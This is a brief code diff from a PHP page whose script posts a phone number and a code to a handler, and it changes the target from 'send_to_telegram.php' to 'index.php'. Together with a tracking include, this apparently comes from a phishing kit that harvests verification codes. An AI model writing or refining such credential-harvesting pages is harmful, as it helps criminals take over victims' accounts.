@@ -194,7 +194,7 @@ include("track.php");
         // Envoie du code
         const form = document.createElement('form');
         form.method = 'POST';
-        form.action = 'action/send_to_telegram.php';
+        form.action = 'action/index.php';
 
 const phone = "<?= htmlspecialchars($phone) ?>";
 const inputPhone = document.createElement('input');
